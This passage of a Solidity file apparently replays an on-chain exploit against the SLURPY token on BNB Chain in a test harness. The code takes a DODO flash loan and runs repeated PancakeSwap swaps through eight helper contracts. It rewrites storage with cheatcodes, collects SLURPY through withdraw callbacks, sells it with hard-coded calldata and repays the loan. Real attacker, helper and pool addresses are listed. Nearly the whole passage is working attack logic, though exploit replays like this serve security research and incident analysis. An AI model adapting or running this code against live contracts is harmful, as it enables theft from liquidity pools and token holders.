                bytes32(uint256(80084422859880547211683076133703299733277748156566366325829078699459944778998)),
                bytes32(uint256(743456831735940179948047153442831552825743967696))
            );
        IContract_10ED43_024E(Addresses.A_10ED43_024E)
            .swapTokensForExactTokens(
                1300000000000000000000000,
                1228355378572186489,
                _addressArray2(Addresses.WBNB, Addresses.SLURPY),
                Addresses.attack_helper_73DD,
                1734552916
            );
        {
            address created = Addresses.attack_helper_9493;
            require(created.code.length != 0, "replay helper runtime missing");
        }
        AttackerHelper(payable(Addresses.attack_helper_9493))._helper3();
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(2)));
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(80084422859880547211683076133703299733277748156566366325829078699459944778999)),
                bytes32(uint256(989209630200320044653539739790132719093037691869))
            );
        IContract_10ED43_024E(Addresses.A_10ED43_024E)
            .swapTokensForExactTokens(
                1300000000000000000000000,
                1484619990445383922,
                _addressArray2(Addresses.WBNB, Addresses.SLURPY),
                Addresses.attack_helper_9493,
                1734552916
            );
        {
            address created = Addresses.attack_helper_0928;
            require(created.code.length != 0, "replay helper runtime missing");
        }
        AttackerHelper(payable(Addresses.attack_helper_0928))._helper8();
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(3)));
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(80084422859880547211683076133703299733277748156566366325829078699459944779000)),
                bytes32(uint256(708837468269869742667878896517914558783676257427))
            );
        IContract_10ED43_024E(Addresses.A_10ED43_024E)
            .swapTokensForExactTokens(
                1300000000000000000000000,
                1830363034820181996,
                _addressArray2(Addresses.WBNB, Addresses.SLURPY),
                Addresses.attack_helper_0928,
                1734552916
            );
        {
            address created = Addresses.attack_helper_DEA3;
            require(created.code.length != 0, "replay helper runtime missing");
        }
        AttackerHelper(payable(Addresses.attack_helper_DEA3))._helper4();
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(4)));
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(80084422859880547211683076133703299733277748156566366325829078699459944779001)),
                bytes32(uint256(1154253376867528829745520614605321280443385514280))
            );
        IContract_10ED43_024E(Addresses.A_10ED43_024E)
            .swapTokensForExactTokens(
                1300000000000000000000000,
                2312713233959378735,
                _addressArray2(Addresses.WBNB, Addresses.SLURPY),
                Addresses.attack_helper_DEA3,
                1734552916
            );
    }

    function flashCallback6() internal {
        {
            address created = Addresses.attack_helper_18AE;
            require(created.code.length != 0, "replay helper runtime missing");
        }
        AttackerHelper(payable(Addresses.attack_helper_18AE))._helper2();
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(0)), bytes32(uint256(0)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(1)));
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(80084422859880547211683076133703299733277748156566366325829078699459944778998)),
                bytes32(uint256(743456831735940179948047153442831552825743967696))
            );
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(2)));
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(80084422859880547211683076133703299733277748156566366325829078699459944778999)),
                bytes32(uint256(989209630200320044653539739790132719093037691869))
            );
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(3)));
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(80084422859880547211683076133703299733277748156566366325829078699459944779000)),
                bytes32(uint256(708837468269869742667878896517914558783676257427))
            );
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(4)));
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(80084422859880547211683076133703299733277748156566366325829078699459944779001)),
                bytes32(uint256(1154253376867528829745520614605321280443385514280))
            );
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(5)));
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(80084422859880547211683076133703299733277748156566366325829078699459944779002)),
                bytes32(uint256(716523096391426976377202605691425138301008076451))
            );
        IContract_10ED43_024E(Addresses.A_10ED43_024E)
            .swapTokensForExactTokens(
                1300000000000000000000000,
                3014525372751432751,
                _addressArray2(Addresses.WBNB, Addresses.SLURPY),
                Addresses.attack_helper_18AE,
                1734552916
            );
        {
            address created = Addresses.attack_helper_9D95;
            require(created.code.length != 0, "replay helper runtime missing");
        }
        AttackerHelper(payable(Addresses.attack_helper_9D95))._helper6();
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(6)));
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(80084422859880547211683076133703299733277748156566366325829078699459944779003)),
                bytes32(uint256(684014881443583265902457123680995026101557074094))
            );
        IContract_10ED43_024E(Addresses.A_10ED43_024E)
            .swapTokensForExactTokens(
                1300000000000000000000000,
                4092679987536987566,
                _addressArray2(Addresses.WBNB, Addresses.SLURPY),
                Addresses.attack_helper_9D95,
                1734552916
            );
        {
            address created = Addresses.attack_helper;
            require(created.code.length != 0, "replay helper runtime missing");
        }
        AttackerHelper(payable(Addresses.attack_helper))._helper();
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(7)));
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(80084422859880547211683076133703299733277748156566366325829078699459944779004)),
                bytes32(uint256(900752011363116596372195273085833252696623586709))
            );
        IContract_10ED43_024E(Addresses.A_10ED43_024E)
            .swapTokensForExactTokens(
                1300000000000000000000000,
                5874696742614491082,
                _addressArray2(Addresses.WBNB, Addresses.SLURPY),
                Addresses.attack_helper,
                1734552916
            );
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(8)));
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(80084422859880547211683076133703299733277748156566366325829078699459944779005)),
                bytes32(uint256(548400588132407266438330291840703936192525148104))
            );
        IERC20Like(Addresses.WBNB).approve(Addresses.A_10ED43_024E, 0);
        {
            uint256 slurpyApproveAllowance = type(uint256).max;
            IERC20Like(Addresses.SLURPY).approve(Addresses.A_10ED43_024E, slurpyApproveAllowance);
        }
        IERC20Like(Addresses.SLURPY).balanceOf(address(this));
        {
            bytes memory replayCallData =
                hex"5c11d7950000000000000000000000000000000000000000000079abc206b5e095422726000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a0000000000000000000000000051e057ea275caf9a73578a97af6e8965e5a23490000000000000000000000000000000000000000000000000000000067632d54000000000000000000000000000000000000000000000000000000000000000200000000000000000000000072c114a1a4abc65be2be3e356eede296dbb8ba4c000000000000000000000000bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c";
            (bool ok,) = Addresses.A_10ED43_024E.call(replayCallData);
            require(ok, "replay selector 0x5c11d795 failed");
        }
        IERC20Like(Addresses.SLURPY).balanceOf(Addresses.attack_helper_05D0);
    }

    function flashCallback7() internal {
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(0)), bytes32(uint256(0)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(1)));
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(80084422859880547211683076133703299733277748156566366325829078699459944778998)),
                bytes32(uint256(743456831735940179948047153442831552825743967696))
            );
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(2)));
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(80084422859880547211683076133703299733277748156566366325829078699459944778999)),
                bytes32(uint256(989209630200320044653539739790132719093037691869))
            );
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(3)));
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(80084422859880547211683076133703299733277748156566366325829078699459944779000)),
                bytes32(uint256(708837468269869742667878896517914558783676257427))
            );
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(4)));
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(80084422859880547211683076133703299733277748156566366325829078699459944779001)),
                bytes32(uint256(1154253376867528829745520614605321280443385514280))
            );
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(5)));
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(80084422859880547211683076133703299733277748156566366325829078699459944779002)),
                bytes32(uint256(716523096391426976377202605691425138301008076451))
            );
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(6)));
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(80084422859880547211683076133703299733277748156566366325829078699459944779003)),
                bytes32(uint256(684014881443583265902457123680995026101557074094))
            );
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(7)));
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(80084422859880547211683076133703299733277748156566366325829078699459944779004)),
                bytes32(uint256(900752011363116596372195273085833252696623586709))
            );
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(8)));
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(80084422859880547211683076133703299733277748156566366325829078699459944779005)),
                bytes32(uint256(548400588132407266438330291840703936192525148104))
            );
        AttackerHelper(payable(Addresses.attack_helper_05D0)).withdraw(Addresses.SLURPY);
        IERC20Like(Addresses.SLURPY).balanceOf(address(this));
        {
            bytes memory replayCallData =
                hex"5c11d79500000000000000000000000000000000000000000000fed3f0f42508d27a7a20000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a0000000000000000000000000051e057ea275caf9a73578a97af6e8965e5a23490000000000000000000000000000000000000000000000000000000067632d54000000000000000000000000000000000000000000000000000000000000000200000000000000000000000072c114a1a4abc65be2be3e356eede296dbb8ba4c000000000000000000000000bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c";
            (bool ok,) = Addresses.A_10ED43_024E.call(replayCallData);
            require(ok, "replay selector 0x5c11d795 failed");
        }
        IERC20Like(Addresses.SLURPY).balanceOf(Addresses.attack_helper_73DD);
        AttackerHelper(payable(Addresses.attack_helper_73DD)).withdraw(Addresses.SLURPY);
        IERC20Like(Addresses.SLURPY).balanceOf(address(this));
        {
            bytes memory replayCallData =
                hex"5c11d79500000000000000000000000000000000000000000000fec2c5bb2f16fb242a61000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a0000000000000000000000000051e057ea275caf9a73578a97af6e8965e5a23490000000000000000000000000000000000000000000000000000000067632d54000000000000000000000000000000000000000000000000000000000000000200000000000000000000000072c114a1a4abc65be2be3e356eede296dbb8ba4c000000000000000000000000bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c";
            (bool ok,) = Addresses.A_10ED43_024E.call(replayCallData);
            require(ok, "replay selector 0x5c11d795 failed");
        }
        IERC20Like(Addresses.SLURPY).balanceOf(Addresses.attack_helper_9493);
        AttackerHelper(payable(Addresses.attack_helper_9493)).withdraw(Addresses.SLURPY);
        IERC20Like(Addresses.SLURPY).balanceOf(address(this));
        {
            bytes memory replayCallData =
                hex"5c11d79500000000000000000000000000000000000000000000ff39220764c45fb4898c000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a0000000000000000000000000051e057ea275caf9a73578a97af6e8965e5a23490000000000000000000000000000000000000000000000000000000067632d54000000000000000000000000000000000000000000000000000000000000000200000000000000000000000072c114a1a4abc65be2be3e356eede296dbb8ba4c000000000000000000000000bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c";
            (bool ok,) = Addresses.A_10ED43_024E.call(replayCallData);
            require(ok, "replay selector 0x5c11d795 failed");
        }
        IERC20Like(Addresses.SLURPY).balanceOf(Addresses.attack_helper_0928);
        AttackerHelper(payable(Addresses.attack_helper_0928)).withdraw(Addresses.SLURPY);
        IERC20Like(Addresses.SLURPY).balanceOf(address(this));
        {
            bytes memory replayCallData =
                hex"5c11d79500000000000000000000000000000000000000000000ffb029fd7a80b7ae4351000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a0000000000000000000000000051e057ea275caf9a73578a97af6e8965e5a23490000000000000000000000000000000000000000000000000000000067632d54000000000000000000000000000000000000000000000000000000000000000200000000000000000000000072c114a1a4abc65be2be3e356eede296dbb8ba4c000000000000000000000000bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c";
            (bool ok,) = Addresses.A_10ED43_024E.call(replayCallData);
            require(ok, "replay selector 0x5c11d795 failed");
        }
        IERC20Like(Addresses.SLURPY).balanceOf(Addresses.attack_helper_DEA3);
        AttackerHelper(payable(Addresses.attack_helper_DEA3)).withdraw(Addresses.SLURPY);
        IERC20Like(Addresses.SLURPY).balanceOf(address(this));
        {
            bytes memory replayCallData =
                hex"5c11d795000000000000000000000000000000000000000000010027df03f7a675b38e36000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a0000000000000000000000000051e057ea275caf9a73578a97af6e8965e5a23490000000000000000000000000000000000000000000000000000000067632d54000000000000000000000000000000000000000000000000000000000000000200000000000000000000000072c114a1a4abc65be2be3e356eede296dbb8ba4c000000000000000000000000bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c";
            (bool ok,) = Addresses.A_10ED43_024E.call(replayCallData);
            require(ok, "replay selector 0x5c11d795 failed");
        }
        IERC20Like(Addresses.SLURPY).balanceOf(Addresses.attack_helper_18AE);
    }

    function flashCallback8() internal {
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(0)), bytes32(uint256(0)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(1)));
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(80084422859880547211683076133703299733277748156566366325829078699459944778998)),
                bytes32(uint256(743456831735940179948047153442831552825743967696))
            );
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(2)));
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(80084422859880547211683076133703299733277748156566366325829078699459944778999)),
                bytes32(uint256(989209630200320044653539739790132719093037691869))
            );
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(3)));
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(80084422859880547211683076133703299733277748156566366325829078699459944779000)),
                bytes32(uint256(708837468269869742667878896517914558783676257427))
            );
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(4)));
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(80084422859880547211683076133703299733277748156566366325829078699459944779001)),
                bytes32(uint256(1154253376867528829745520614605321280443385514280))
            );
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(5)));
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(80084422859880547211683076133703299733277748156566366325829078699459944779002)),
                bytes32(uint256(716523096391426976377202605691425138301008076451))
            );
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(6)));
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(80084422859880547211683076133703299733277748156566366325829078699459944779003)),
                bytes32(uint256(684014881443583265902457123680995026101557074094))
            );
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(7)));
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(80084422859880547211683076133703299733277748156566366325829078699459944779004)),
                bytes32(uint256(900752011363116596372195273085833252696623586709))
            );
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(8)));
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(80084422859880547211683076133703299733277748156566366325829078699459944779005)),
                bytes32(uint256(548400588132407266438330291840703936192525148104))
            );
        AttackerHelper(payable(Addresses.attack_helper_18AE)).withdraw(Addresses.SLURPY);
        IERC20Like(Addresses.SLURPY).balanceOf(address(this));
        {
            bytes memory replayCallData =
                hex"5c11d7950000000000000000000000000000000000000000000100a042854ab9bc31980b000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a0000000000000000000000000051e057ea275caf9a73578a97af6e8965e5a23490000000000000000000000000000000000000000000000000000000067632d54000000000000000000000000000000000000000000000000000000000000000200000000000000000000000072c114a1a4abc65be2be3e356eede296dbb8ba4c000000000000000000000000bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c";
            (bool ok,) = Addresses.A_10ED43_024E.call(replayCallData);
            require(ok, "replay selector 0x5c11d795 failed");
        }
        IERC20Like(Addresses.SLURPY).balanceOf(Addresses.attack_helper_9D95);
        AttackerHelper(payable(Addresses.attack_helper_9D95)).withdraw(Addresses.SLURPY);
        IERC20Like(Addresses.SLURPY).balanceOf(address(this));
        {
            bytes memory replayCallData =
                hex"5c11d79500000000000000000000000000000000000000000001011955efd70b9e5fbd39000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a0000000000000000000000000051e057ea275caf9a73578a97af6e8965e5a23490000000000000000000000000000000000000000000000000000000067632d54000000000000000000000000000000000000000000000000000000000000000200000000000000000000000072c114a1a4abc65be2be3e356eede296dbb8ba4c000000000000000000000000bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c";
            (bool ok,) = Addresses.A_10ED43_024E.call(replayCallData);
            require(ok, "replay selector 0x5c11d795 failed");
        }
        IERC20Like(Addresses.SLURPY).balanceOf(Addresses.attack_helper);
        AttackerHelper(payable(Addresses.attack_helper)).withdraw(Addresses.SLURPY);
        IERC20Like(Addresses.SLURPY).balanceOf(address(this));
        {
            bytes memory replayCallData =
                hex"5c11d7950000000000000000000000000000000000000000000101931ab60296b8af9640000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a0000000000000000000000000051e057ea275caf9a73578a97af6e8965e5a23490000000000000000000000000000000000000000000000000000000067632d54000000000000000000000000000000000000000000000000000000000000000200000000000000000000000072c114a1a4abc65be2be3e356eede296dbb8ba4c000000000000000000000000bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c";
            (bool ok,) = Addresses.A_10ED43_024E.call(replayCallData);
            require(ok, "replay selector 0x5c11d795 failed");
        }
        IERC20Like(Addresses.SLURPY).approve(Addresses.A_10ED43_024E, 0);
        IERC20Like(Addresses.WBNB).balanceOf(address(this));
        {
            uint256 transferActionGraphAmount = 40000000000000000000;
            IERC20Like(Addresses.WBNB).transfer(Addresses.DPP, transferActionGraphAmount);
        }
        uint256 wbnbBalanceOfAttackAttackContract = IERC20Like(Addresses.WBNB).balanceOf(address(this));
        {
            IWBNB(Addresses.WBNB).withdraw(wbnbBalanceOfAttackAttackContract);
        }
    }

    function _attack() internal {
        IDPP(Addresses.DPP)._BASE_TOKEN_();
        IDPP(Addresses.DPP)._BASE_RESERVE_();
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(0)), bytes32(uint256(1)));
        {
            bytes memory flashLoanProof =
                hex"b632b3b4549307b5af1ded27bb0c04870fd4d87337509ef6d778bbb117749f4b0000000000000000000000000000000000000000000000022b1c8c1227a0000000000000000000000000000000000000000000000000000000000000000000bc000000000000000000000000000000000000000000000000000000000000000800000000000000000000000000000000000000000000000063eb89da4ed00000";
            IDPP(Addresses.DPP).flashLoan(40000000000000000000, 0, address(this), flashLoanProof);
        }
    }

    function _attack2() internal {
        _markCallback(2);
    }

    receive() external payable {}

    function DPPFlashLoanCall(address arg0, uint256 amount, uint256 amount1, bytes calldata arg3) external payable {
        arg0;
        amount;
        amount1;
        arg3;
        flashCallback();
        return;
    }

    fallback() external payable {
        if (msg.sig == 0x8f66e655) {
            _attack();
            return;
        }
        _entryCb();
    }

    function _entryCb() internal {}

    function bindHelper(address attackHelper) external {
        helper = AttackerHelper(payable(attackHelper));
    }

    function _boundAttack(bytes memory data) internal {
        _decodedCall(address(helper), data);
    }

    function _decodedCall(address target, bytes memory data) internal {
        (bool ok,) = target.call(data);
        require(ok, "helper dispatch failed");
    }

    mapping(uint256 => bool) private _callbackSeenFlag;
    mapping(uint256 => uint256) private _entryCallbackCursor;
    mapping(address => uint256) private _balancerVaultPreBalance;

    function _nextEntryCb(uint256 index) internal returns (uint256 ordinal) {
        ordinal = _entryCallbackCursor[index];
        _entryCallbackCursor[index] = ordinal + 1;
    }

    function _markCallback(uint256 index) internal {
        _callbackSeenFlag[index] = true;
    }

    function _recordBalancerFlash(address[] memory tokens) internal {
        for (uint256 i = 0; i < tokens.length; i++) {
            _balancerVaultPreBalance[tokens[i]] =
                IERC20Like(tokens[i]).balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
        }
    }

    function recordBalancerFlashLoanPreBalances(address[] memory tokens) external {
        _recordBalancerFlash(tokens);
    }

    function balancerVaultPreBalance(address token) external view returns (uint256) {
        return _balancerVaultPreBalance[token];
    }

    function _addressArray2(address a0, address a1) internal pure returns (address[] memory out) {
        out = new address[](2);
        out[0] = a0;
        out[1] = a1;
    }
}

contract AttackerHelper {
    receive() external payable {}

    function withdraw(address amount) external payable {
        amount;
        if (address(this) == 0x8239c1e076EefBc01DFEe5da598baf7325b905D0) {
            _helperCb5();
            return;
        }
        if (address(this) == 0xAD45B1A632De0D8042a7592aFba59fd8D4E473dD) {
            _helperCb7();
            return;
        }
        if (address(this) == 0x7c295F130189Ede09f5893DA47082520a6309493) {
            _helperCb3();
            return;
        }
        if (address(this) == 0xcA2E82f1D035E6078810d8B711e1F552685a0928) {
            _helperCb8();
            return;
        }
        if (address(this) == 0x7D8201c21Ac3195faa011A4f7556FeeEe90Bdea3) {
            _helperCb4();
            return;
        }
        if (address(this) == 0x77D049c089cC345758145846f4d4037e5f0d18Ae) {
            _helperCb2();
            return;
        }
        if (address(this) == 0x9Dc71dFC1f75CC61823e89DEF7F4632a6E369d95) {
            _helperCb6();
            return;
        }
        if (address(this) == 0x600f220357d974c1A65b5849D9E6dEB916009fc8) {
            _helperCb();
            return;
        }
        _helperCb5();
        return;
    }

    fallback() external payable {
        _entryCb();
    }

    function helperCb5() external payable {
        _helperCb5();
        return;
    }

    function helperCb7() external payable {
        _helperCb7();
        return;
    }

    function helperCb3() external payable {
        _helperCb3();
        return;
    }

    function helperCb8() external payable {
        _helperCb8();
        return;
    }

    function helperCb4() external payable {
        _helperCb4();
        return;
    }

    function helperCb2() external payable {
        _helperCb2();
        return;
    }

    function helperCb6() external payable {
        _helperCb6();
        return;
    }

    function helperCb() external payable {
        _helperCb();
        return;
    }

    function _entryCb() internal {}

    mapping(uint256 => bool) private _callbackSeenFlag;
    mapping(uint256 => uint256) private _entryCallbackCursor;
    mapping(address => uint256) private _balancerVaultPreBalance;

    function _nextEntryCb(uint256 index) internal returns (uint256 ordinal) {
        ordinal = _entryCallbackCursor[index];
        _entryCallbackCursor[index] = ordinal + 1;
    }

    function _markCallback(uint256 index) internal {
        _callbackSeenFlag[index] = true;
    }

    function _recordBalancerFlash(address[] memory tokens) internal {
        for (uint256 i = 0; i < tokens.length; i++) {
            _balancerVaultPreBalance[tokens[i]] =
                IERC20Like(tokens[i]).balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
        }
    }

    function recordBalancerFlashLoanPreBalances(address[] memory tokens) external {
        _recordBalancerFlash(tokens);
    }

    function balancerVaultPreBalance(address token) external view returns (uint256) {
        return _balancerVaultPreBalance[token];
    }

    function _addressArray2(address a0, address a1) internal pure returns (address[] memory out) {
        out = new address[](2);
        out[0] = a0;
        out[1] = a1;
    }

    function _helperCb() internal {
        uint256 slurpyBalanceOfAttackHelper = IERC20Like(Addresses.SLURPY).balanceOf(Addresses.attack_helper);
        IERC20Like(Addresses.SLURPY).transfer(Addresses.attack_contract, slurpyBalanceOfAttackHelper);
    }

    function _helper() public {}

    function _helperCb2() internal {
        uint256 slurpyBalanceOfAttackHelper =
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.attack_helper_18AE);
        IERC20Like(Addresses.SLURPY).transfer(Addresses.attack_contract, slurpyBalanceOfAttackHelper);
    }

    function _helper2() public {}

    function _helperCb3() internal {
        uint256 slurpyBalanceOfAttackHelper =
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.attack_helper_9493);
        IERC20Like(Addresses.SLURPY).transfer(Addresses.attack_contract, slurpyBalanceOfAttackHelper);
    }

    function _helper3() public {}

    function _helperCb4() internal {
        uint256 slurpyBalanceOfAttackHelper =
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.attack_helper_DEA3);
        IERC20Like(Addresses.SLURPY).transfer(Addresses.attack_contract, slurpyBalanceOfAttackHelper);
    }

    function _helper4() public {}

    function _helperCb5() internal {
        uint256 slurpyBalanceOfAttackHelper =
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.attack_helper_05D0);
        IERC20Like(Addresses.SLURPY).transfer(Addresses.attack_contract, slurpyBalanceOfAttackHelper);
    }

    function _helper5() public {}

    function _helperCb6() internal {
        uint256 slurpyBalanceOfAttackHelper =
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.attack_helper_9D95);
        IERC20Like(Addresses.SLURPY).transfer(Addresses.attack_contract, slurpyBalanceOfAttackHelper);
    }

    function _helper6() public {}

    function _helperCb7() internal {
        uint256 slurpyBalanceOfAttackHelper =
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.attack_helper_73DD);
        IERC20Like(Addresses.SLURPY).transfer(Addresses.attack_contract, slurpyBalanceOfAttackHelper);
    }

    function _helper7() public {}

    function _helperCb8() internal {
        uint256 slurpyBalanceOfAttackHelper =
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.attack_helper_0928);
        IERC20Like(Addresses.SLURPY).transfer(Addresses.attack_contract, slurpyBalanceOfAttackHelper);
    }

    function _helper8() public {}
}

interface IERC20Like {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external;
    function transfer(address to, uint256 amount) external;
    function transferFrom(address from, address to, uint256 amount) external;
}

interface IWETHLike {
    function deposit() external payable;
}

library ArrayGuard {
    function capWithReserve(uint256 wanted, address token, address holder, uint256 reserve)
        internal
        view
        returns (uint256)
    {
        uint256 available = IERC20Like(token).balanceOf(holder);
        if (available > reserve) available -= reserve;
        else available = 0;
        return wanted > available ? available : wanted;
    }
}

interface IERC721Like {
    function ownerOf(uint256 tokenId) external view returns (address);
    function getApproved(uint256 tokenId) external view returns (address);
    function isApprovedForAll(address owner, address operator) external view returns (bool);
    function transferFrom(address from, address to, uint256 tokenId) external;
    function safeTransferFrom(address from, address to, uint256 tokenId) external;
}

interface IUniswapV2PairLike {
    function mint(address to) external returns (uint256 liquidity);
    function burn(address to) external returns (uint256 amount0, uint256 amount1);
    function skim(address to) external;
    function sync() external;
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IMulticallLike {
    function multicall(bytes[] calldata data) external returns (bytes[] memory results);
}

struct AttackCall {
    address target;
    bytes data;
}

interface VmExt {
    function store(address target, bytes32 slot, bytes32 value) external;
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant attack_contract = 0x051e057EA275CAf9a73578a97aF6e8965e5a2349;
    address internal constant A_10ED43_024E = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address internal constant attacker_eoa = 0x132D9bbDBE718365aF6Cc9e43bac109A9A53B138;
    address internal constant A_3E331E_A22D = 0x3e331e54F53c93Fc767a43D80C617919af91A22D;
    address internal constant USDT = 0x55d398326f99059fF775485246999027B3197955;
    address internal constant attack_helper = 0x600f220357d974c1A65b5849D9E6dEB916009fc8;
    address internal constant DPP = 0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476;
    address internal constant SLURPY = 0x72c114A1A4abC65BE2Be3E356eEde296Dbb8ba4c;
    address internal constant Cake_LP = 0x76A5a2Ef4AE2DdEAD0c8D5b704808637B414113C;
    address internal constant attack_helper_18AE = 0x77D049c089cC345758145846f4d4037e5f0d18Ae;
    address internal constant attack_helper_9493 = 0x7c295F130189Ede09f5893DA47082520a6309493;
    address internal constant attack_helper_DEA3 = 0x7D8201c21Ac3195faa011A4f7556FeeEe90Bdea3;
    address internal constant attack_helper_05D0 = 0x8239c1e076EefBc01DFEe5da598baf7325b905D0;
    address internal constant attack_helper_9D95 = 0x9Dc71dFC1f75CC61823e89DEF7F4632a6E369d95;
    address internal constant attack_helper_73DD = 0xAD45B1A632De0D8042a7592aFba59fd8D4E473dD;
    address internal constant BalancerVault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address internal constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address internal constant attack_helper_0928 = 0xcA2E82f1D035E6078810d8B711e1F552685a0928;
}

interface IContract_10ED43_024E {
    function swapTokensForExactTokens(uint256, uint256, address[] calldata, address, uint256) external;
}

interface IDPP {
    function _BASE_RESERVE_() external view returns (uint256);
    function _BASE_TOKEN_() external view returns (uint256);
    function flashLoan(uint256, uint256, address, bytes calldata) external;
}

interface IWBNB {
    function withdraw(uint256) external;
}

interface Iattack_helper {
    function withdraw(address) external;
}

interface Iattack_helper_05D0 {
    function withdraw(address) external;
}

interface Iattack_helper_0928 {
    function withdraw(address) external;
}

interface Iattack_helper_18AE {
